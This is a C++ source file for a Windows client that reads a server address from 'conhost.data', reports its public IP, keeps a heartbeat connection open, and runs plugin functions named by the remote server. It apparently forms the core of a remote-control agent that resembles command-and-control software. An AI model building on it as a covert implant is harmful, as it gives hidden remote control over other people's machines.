#include "clientPlugin.h"
#include "httplib.h"

#define STOPHEALTHCHECK 0

using std::ifstream;
using std::ios;
using std::map;
using std::ofstream;
using std::string;
using std::thread;
using std::to_string;

std::atomic<bool> ServerHealthCheck(false);
string GetFirstLocalIPAddress();
// void sendToServer(bool state = true);
void open_telnet();
void HealthCheck();
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

inline const std::string getMyWanIp(void)
{
      static httplib::Client cli("http://ipinfo.io");
      const auto &res = cli.Get("/json");
      if (res && res->status == 200)
      {
            const std::string &keyword("\"ip\": \"");
            const std::string &ret = res->body.substr(res->body.find(keyword) + keyword.length());
            return ret.substr(0, ret.find("\""));
      }
      return "NULL";
}

void GetConnectForServer(bool state = true)
{
      WSAStartup(MAKEWORD(2, 2), &wsaData);
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      addr.sin_family = AF_INET;
      addr.sin_port = htons(serverPort);
      addr.sin_addr.s_addr = inet_addr(ip.c_str());
      while (connect(s, (SOCKADDR *)&addr, sizeof(addr)) != 0)
            ;
      sockaddr_in localAddr;
      int addrLen = sizeof(localAddr);
      if (getsockname(s, (sockaddr *)&localAddr, &addrLen) == 0)
      {
            localPort = ntohs(localAddr.sin_port);
      }

      string wanip = getMyWanIp();
      send_message(s, "Client");
      string buf;
      receive_message(s, buf);
      if (strcmp(((string)buf).c_str(), "OK") == 0)
      {
            string sendBuf = wanip + " " + to_string(localPort);
            send_message(s, sendBuf);
            receive_message(s, buf);
            SEID = buf;
            HealthyBeat = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            addr2.sin_family = AF_INET;
            addr2.sin_port = htons(serverPort);
            addr2.sin_addr.s_addr = inet_addr(ip.c_str());
            while (connect(HealthyBeat, (SOCKADDR *)&addr2, sizeof(addr2)) != 0)
                  ;
            send_message(HealthyBeat, SEID);
            while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
                  ;
            ServerState = true;
            ServerHealthCheck.exchange(false, std::memory_order_release);
      }
      return;
}

void LoadData()
{
      ifstream in;
      in.open("conhost.data", ios::out);
      if (in.is_open())
      {
            getline(in, ip);
            string port;
            getline(in, port);
            serverPort = stoi(port);
      }
      else
      {
            ip = "127.0.0.1";
            serverPort = 6020;
      }
}
void healthyCheck(SOCKET HealthyBeat)
{
      int timeout = 10000; // 设置超时时间为 10 秒
      setsockopt(HealthyBeat, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
      setsockopt(HealthyBeat, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
      while (1)
      {
            string buf;
            int state = receive_message(HealthyBeat, buf);
            if (buf == "exit")
            {
                  send_message(HealthyBeat, "\r\nClose\r\n");
                  ServerState = false;
                  return;
            }
            int state1 = send_message(HealthyBeat, buf);
            if (!STOPHEALTHCHECK && (state == SOCKET_ERROR || state1 == SOCKET_ERROR))
            {
                  while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
                        ;
                  ServerState = false;
                  ServerHealthCheck.exchange(false, std::memory_order_release);
                  return;
            }
      }
}

int main(int argc, char *argv[])
{
      LoadData();
      GetConnectForServer();
      thread healthCheckThread = thread(healthyCheck, HealthyBeat);

      while (ServerState)
      {
            string buf;
            if (receive_message(s, buf))
            {
                  string funName = buf;
                  clientPluginInfo info;
                  if (PluginManager::findFun(funName))
                  {
                        send_message(s, "find");
                        if (PluginManager::runFun(funName, info))
                              send_message(s, "sec");
                        else
                              send_message(s, "err");
                  }
                  else
                        send_message(s, "nfind");
            }
      }
      healthCheckThread.join();
      closesocket(HealthyBeat);
      closesocket(s);
      WSACleanup();
      return 0;
}
